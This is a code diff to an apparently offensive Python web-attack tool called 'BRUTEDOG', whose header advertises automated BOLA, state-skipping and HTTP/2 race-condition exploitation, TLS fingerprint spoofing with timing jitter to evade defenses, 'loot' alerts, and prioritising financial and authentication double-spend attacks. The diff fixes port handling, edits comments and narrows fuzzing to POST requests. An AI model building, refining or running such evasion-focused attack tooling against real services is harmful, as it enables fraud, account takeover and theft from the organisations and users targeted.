@@ -6,6 +6,7 @@ Features:
 - Real-time mid-flight bottleneck adaptation: Cognitive operator instantly evaluates defenses and mutates vector strategy mid-execution.
 - High-concurrency SecureTransport middleware with TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter.
 - Automated BOLA, state-skipping, and HTTP/2 single-packet concurrency race condition exploitation.
+- Zero-Noise Fuzzing Optimization: Strips broken HTTP methods (HEAD, OPTIONS, duplicate port concatenations) and prioritizes financial/auth double-spend vectors.
 """
 import asyncio
 import json
@@ -154,7 +155,7 @@ def dispatch_critical_loot_alert(loot_type, details):
             pass
 
 # ============================================================
-# TARGET HANDLING & NORMALIZATION GUARD
+# TARGET HANDLING & NORMALIZATION GUARD (PORT DUP FIX)
 # ============================================================
 def get_target():
     section("BRUTEDOG TARGET CONFIGURATION")
@@ -173,8 +174,9 @@ def get_target():
     query = f"?{parsed.query}" if parsed.query else ""
     fragment = f"#{parsed.fragment}" if parsed.fragment else ""
     
+    # Strictly normalize host & port to prevent double concatenation bugs (e.g. :443:443)
     if port:
-        if (scheme == "https" and port != 443) or (scheme == "http" and port != 80):
+        if not ((scheme == "https" and port == 443) or (scheme == "http" and port == 80)):
             netloc = f"{netloc}:{port}"
             
     return f"{scheme}://{netloc}{path}{query}{fragment}".rstrip("/")
@@ -197,7 +199,6 @@ def detect_database_errors(body):
     return findings
 
 def inspect_cookie_security(headers):
-    # Case-insensitive header dictionary lookup
     cookie_header = None
     for k, v in headers.items():
         if k.lower() == "set-cookie":
@@ -231,7 +232,7 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         except Exception:
             pass
     
-    # Real-time mid-flight cognitive adaptation
+    # Real-time mid-flight cognitive adaptation & active feedback loop
     if cognitive_brain:
         try:
             cognitive_result = cognitive_brain.evaluate_and_execute(
@@ -265,7 +266,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         (len(body.strip()) < 200 and "token" not in body_lower)
     )
     
-    # Strict JSON validation & differential schema matching to eliminate false positives
     has_valid_auth_indicator = False
     extracted_proof = {}
     try:
@@ -403,6 +403,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
         executed_payloads.add(payload_key)
 
         try:
+            # Prioritize high-value methods (POST/PUT/GET) and skip noisy dead methods
             status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
         except Exception:
             status = 0
